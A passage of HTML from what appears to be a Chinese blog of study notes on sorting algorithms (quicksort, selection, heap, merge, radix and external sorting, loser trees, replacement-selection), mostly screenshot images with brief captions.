<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020175809579.png"
                      alt="image-20241020175809579"
                ></p>
<p>3、递归对左右子表进行基准划分</p>
<p>左子表</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020175858540.png"
                      alt="image-20241020175858540"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020175907492.png"
                      alt="image-20241020175907492"
                ></p>
<p>右子表</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020175927680.png"
                      alt="image-20241020175927680"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020175945154.png"
                      alt="image-20241020175945154"
                ></p>
<h5 id="算法实现-1"><a href="#算法实现-1" class="headerlink" title="算法实现"></a>算法实现</h5><p>需要用到函数递归调用栈（但时间复杂度忽略不计）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020180057465.png"
                      alt="image-20241020180057465"
                ></p>
<h5 id="时间复杂度与空间复杂度-2"><a href="#时间复杂度与空间复杂度-2" class="headerlink" title="时间复杂度与空间复杂度"></a>时间复杂度与空间复杂度</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020180216798.png"
                      alt="image-20241020180216798"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020180338804.png"
                      alt="image-20241020180338804"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020180319219.png"
                      alt="image-20241020180319219"
                ></p>
<h5 id="总结-10"><a href="#总结-10" class="headerlink" title="总结"></a>总结</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020180400472.png"
                      alt="image-20241020180400472"
                ></p>
<hr>
<h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><h4 id="简单选择排序"><a href="#简单选择排序" class="headerlink" title="简单选择排序"></a>简单选择排序</h4><h5 id="定义-6"><a href="#定义-6" class="headerlink" title="定义"></a>定义</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020180530734.png"
                      alt="image-20241020180530734"
                ></p>
<h5 id="原理-13"><a href="#原理-13" class="headerlink" title="原理"></a>原理</h5><p>对未进行排序的元素进行选择一个最小（最大）的元素，并将其放入有序子序列</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020180648361.png"
                      alt="image-20241020180648361"
                ></p>
<h5 id="代码实现-11"><a href="#代码实现-11" class="headerlink" title="代码实现"></a>代码实现</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020180707185.png"
                      alt="image-20241020180707185"
                ></p>
<h5 id="时间复杂度与空间复杂度-3"><a href="#时间复杂度与空间复杂度-3" class="headerlink" title="时间复杂度与空间复杂度"></a>时间复杂度与空间复杂度</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020180734893.png"
                      alt="image-20241020180734893"
                ></p>
<h5 id="总结-11"><a href="#总结-11" class="headerlink" title="总结"></a>总结</h5><p><strong>不会因为原序列初始状态而改变时间复杂度</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020180757459.png"
                      alt="image-20241020180757459"
                ></p>
<h4 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h4><h5 id="定义堆"><a href="#定义堆" class="headerlink" title="定义堆"></a>定义堆</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020180843383.png"
                      alt="image-20241020180843383"
                ></p>
<p><strong>大根堆：即所有根节点大于其所有左右子树的结点</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020180934164.png"
                      alt="image-20241020180934164"
                ></p>
<p><strong>小根堆：即所有根节点小于其所有左右子树的结点</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020181015029.png"
                      alt="image-20241020181015029"
                ></p>
<h5 id="建立大根堆"><a href="#建立大根堆" class="headerlink" title="建立大根堆"></a>建立大根堆</h5><p>1、找到序号最大（后续一次减小）的根结点，比较看是否满足大根堆，不满足则替换</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020181148582.png"
                      alt="image-20241020181148582"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020181206890.png"
                      alt="image-20241020181206890"
                ></p>
<p>2、找到序号倒数第二大的根结点，比较看是否满足大根堆，不满足则替换</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020181253591.png"
                      alt="image-20241020181253591"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020181259591.png"
                      alt="image-20241020181259591"
                ></p>
<p>3、当出现更小的元素“下坠”时，进行向下调整，直至无法下调</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020181343406.png"
                      alt="image-20241020181343406"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020181410488.png"
                      alt="image-20241020181410488"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020181428820.png"
                      alt="image-20241020181428820"
                ></p>
<h6 id="代码实现-12"><a href="#代码实现-12" class="headerlink" title="代码实现"></a>代码实现</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020181517498.png"
                      alt="image-20241020181517498"
                ></p>
<h6 id="堆的插入与删除"><a href="#堆的插入与删除" class="headerlink" title="堆的插入与删除"></a>堆的插入与删除</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020182302499.png"
                      alt="image-20241020182302499"
                ></p>
<h5 id="基于大根堆排序"><a href="#基于大根堆排序" class="headerlink" title="基于大根堆排序"></a>基于大根堆排序</h5><h6 id="原理-14"><a href="#原理-14" class="headerlink" title="原理"></a>原理</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020181642989.png"
                      alt="image-20241020181642989"
                ></p>
<p><strong>最大的87已被移除大根堆</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020181652702.png"
                      alt="image-20241020181652702"
                ></p>
<p><strong>调整，使让09不断下坠</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020181728736.png"
                      alt="image-20241020181728736"
                ></p>
<h6 id="代码实现-13"><a href="#代码实现-13" class="headerlink" title="代码实现"></a>代码实现</h6><p>移除后再建立新堆</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020181830123.png"
                      alt="image-20241020181830123"
                ></p>
<h5 id="时间复杂度与空间复杂度-4"><a href="#时间复杂度与空间复杂度-4" class="headerlink" title="时间复杂度与空间复杂度"></a>时间复杂度与空间复杂度</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020181959296.png"
                      alt="image-20241020181959296"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020182021994.png"
                      alt="image-20241020182021994"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020182030525.png"
                      alt="image-20241020182030525"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020182107136.png"
                      alt="image-20241020182107136"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020182113995.png"
                      alt="image-20241020182113995"
                ></p>
<h5 id="总结-12"><a href="#总结-12" class="headerlink" title="总结"></a>总结</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020182207698.png"
                      alt="image-20241020182207698"
                ></p>
<hr>
<h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><h4 id="定义-7"><a href="#定义-7" class="headerlink" title="定义"></a>定义</h4><p><strong>把两个或多个已经有序的序列合并成一个（递归）</strong></p>
<p>（二路）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021010312292.png"
                      alt="image-20241021010312292"
                ></p>
<p>（四路）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021010410434.png"
                      alt="image-20241021010410434"
                ></p>
<h4 id="原理（二路）"><a href="#原理（二路）" class="headerlink" title="原理（二路）"></a>原理（二路）</h4><p>1、将序列中两两归并</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021010458285.png"
                      alt="image-20241021010458285"
                ></p>
<p>2、将序列中两两归并后的两组两两归并</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021010522076.png"
                      alt="image-20241021010522076"
                ></p>
<p>3、将两组归并后的4个1组的再进行归并，最后得到一个完整的序列</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021010549182.png"
                      alt="image-20241021010549182"
                ></p>
<h4 id="代码实现-14"><a href="#代码实现-14" class="headerlink" title="代码实现"></a>代码实现</h4><p>使用一个数组进行全部复制，使用两个指针进行对原数组的复写</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021010707967.png"
                      alt="image-20241021010707967"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021010801115.png"
                      alt="image-20241021010801115"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021010831273.png"
                      alt="image-20241021010831273"
                ></p>
<h5 id="完整代码（递归）"><a href="#完整代码（递归）" class="headerlink" title="完整代码（递归）"></a>完整代码（递归）</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021010857453.png"
                      alt="image-20241021010857453"
                ></p>
<h4 id="时间复杂度与空间复杂度-5"><a href="#时间复杂度与空间复杂度-5" class="headerlink" title="时间复杂度与空间复杂度"></a>时间复杂度与空间复杂度</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021011133937.png"
                      alt="image-20241021011133937"
                ></p>
<h4 id="总结-13"><a href="#总结-13" class="headerlink" title="总结"></a>总结</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021011156860.png"
                      alt="image-20241021011156860"
                ></p>
<hr>
<h3 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h3><h4 id="定义-8"><a href="#定义-8" class="headerlink" title="定义"></a>定义</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021011901032.png"
                      alt="image-20241021011901032"
                ></p>
<p>（不基于关键字进行对比，而是对其关键字的每一位数进行对比然后排序）</p>
<h4 id="原理-15"><a href="#原理-15" class="headerlink" title="原理"></a>原理</h4><p>1、对数字的个位进行分配（首次无需管顺序）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021011258543.png"
                      alt="image-20241021011258543"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021011308089.png"
                      alt="image-20241021011308089"
                ></p>
<p>2、对第一次分配的进行收集（从前往后连成一条新的序列）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021011358871.png"
                      alt="image-20241021011358871"
                ></p>
<p>3、对数字的十位进行分配（个位数越大的越先入队）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021011409685.png"
                      alt="image-20241021011409685"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021011454936.png"
                      alt="image-20241021011454936"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021011507073.png"
                      alt="image-20241021011507073"
                ></p>
<p>4、对第二次分配进行收集（从前往后连成一条新的序列）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021011541271.png"
                      alt="image-20241021011541271"
                ></p>
<p>5、对数字的百位进行分配（十位数越大的越先入队）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021011621927.png"
                      alt="image-20241021011621927"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021011700397.png"
                      alt="image-20241021011700397"
                ></p>
<p>6、对第三趟分配进行收集（从前往后连成一条新的序列）（基本已顺序排列）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021011721278.png"
                      alt="image-20241021011721278"
                ></p>
<p><strong>综合</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021011754078.png"
                      alt="image-20241021011754078"
                ></p>
<h4 id="代码实现-15"><a href="#代码实现-15" class="headerlink" title="代码实现"></a>代码实现</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021011940922.png"
                      alt="image-20241021011940922"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021012150316.png"
                      alt="image-20241021012150316"
                ></p>
<h4 id="时间复杂度与空间复杂度-6"><a href="#时间复杂度与空间复杂度-6" class="headerlink" title="时间复杂度与空间复杂度"></a>时间复杂度与空间复杂度</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021012133248.png"
                      alt="image-20241021012133248"
                ></p>
<h4 id="应用角度"><a href="#应用角度" class="headerlink" title="应用角度"></a>应用角度</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021012224293.png"
                      alt="image-20241021012224293"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021012405059.png"
                      alt="image-20241021012405059"
                ></p>
<h4 id="总结-14"><a href="#总结-14" class="headerlink" title="总结"></a>总结</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021012430015.png"
                      alt="image-20241021012430015"
                ></p>
<hr>
<h3 id="外部排序"><a href="#外部排序" class="headerlink" title="外部排序"></a>外部排序</h3><h4 id="原理-16"><a href="#原理-16" class="headerlink" title="原理"></a>原理</h4><p>数据元素太多，需要借助外存和内存的缓冲区进行在内存实现归并后写入外存并复写原数据</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021012531897.png"
                      alt="image-20241021012531897"
                ></p>
<h4 id="时间开销"><a href="#时间开销" class="headerlink" title="时间开销"></a>时间开销</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021012647468.png"
                      alt="image-20241021012647468"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021012700945.png"
                      alt="image-20241021012700945"
                ></p>
<h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><h5 id="多路归并"><a href="#多路归并" class="headerlink" title="多路归并"></a>多路归并</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021012731274.png"
                      alt="image-20241021012731274"
                ></p>
<h5 id="优化：减少初始归并段"><a href="#优化：减少初始归并段" class="headerlink" title="优化：减少初始归并段"></a>优化：减少初始归并段</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021013036872.png"
                      alt="image-20241021013036872"
                ></p>
<h5 id="总结-15"><a href="#总结-15" class="headerlink" title="总结"></a>总结</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021012848089.png"
                      alt="image-20241021012848089"
                ></p>
<p><strong>k越大不一定越好</strong>（可通过败者树优化）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021012912761.png"
                      alt="image-20241021012912761"
                ></p>
<h4 id="败者树（k路归并优化）"><a href="#败者树（k路归并优化）" class="headerlink" title="败者树（k路归并优化）"></a>败者树（k路归并优化）</h4><h5 id="优化原因"><a href="#优化原因" class="headerlink" title="优化原因"></a>优化原因</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021013204871.png"
                      alt="image-20241021013204871"
                ></p>
<h5 id="定义-9"><a href="#定义-9" class="headerlink" title="定义"></a>定义</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021013238957.png"
                      alt="image-20241021013238957"
                ></p>
<h5 id="原理-17"><a href="#原理-17" class="headerlink" title="原理"></a>原理</h5><p><strong>构建败者树</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021013305989.png"
                      alt="image-20241021013305989"
                ></p>
<p>选出每一个比赛的失败者记录其所在段号，最后的胜利者单独记录段号</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021013411626.png"
                      alt="image-20241021013411626"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021013420385.png"
                      alt="image-20241021013420385"
                ></p>
<p><strong>败者树更替</strong></p>
<p>归并段3的6对树中结点进行比较</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021013531710.png"
                      alt="image-20241021013531710"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021013549704.png"
                      alt="image-20241021013549704"
                ></p>
<p>选出最小元素</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021013650245.png"
                      alt="image-20241021013650245"
                ></p>
<h5 id="对比次数"><a href="#对比次数" class="headerlink" title="对比次数"></a>对比次数</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021013721545.png"
                      alt="image-20241021013721545"
                ></p>
<h4 id="总结-16"><a href="#总结-16" class="headerlink" title="总结"></a>总结</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021013831737.png"
                      alt="image-20241021013831737"
                ></p>
<hr>
<h3 id="置换-选择排序"><a href="#置换-选择排序" class="headerlink" title="置换-选择排序"></a>置换-选择排序</h3><h4 id="原理-18"><a href="#原理-18" class="headerlink" title="原理"></a>原理</h4><p><strong>可以让每个初始归并段的长度超越内存工作区大小的限制</strong></p>
<p>通过内存工作区，得到多个归并段</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021013933263.png"
                      alt="image-20241021013933263"
                ></p>
<p>当遇到与当前归并段不符合的顺序数时进行停留，待工作区满后开启新的归并段</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021014015038.png"
                      alt="image-20241021014015038"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021014023919.png"
                      alt="image-20241021014023919"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021014125443.png"
                      alt="image-20241021014125443"
                ></p>
<p>最终得到多个归并段</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021014151408.png"
                      alt="image-20241021014151408"
                ></p>
<h5 id="具体文字描述"><a href="#具体文字描述" class="headerlink" title="具体文字描述"></a>具体文字描述</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021014247281.png"
                      alt="image-20241021014247281"
                ></p>
<hr>
<h3 id="最佳归并树"><a href="#最佳归并树" class="headerlink" title="最佳归并树"></a>最佳归并树</h3><h4 id="定义-10"><a href="#定义-10" class="headerlink" title="定义"></a>定义</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021014331011.png"
                      alt="image-20241021014331011"
                ></p>
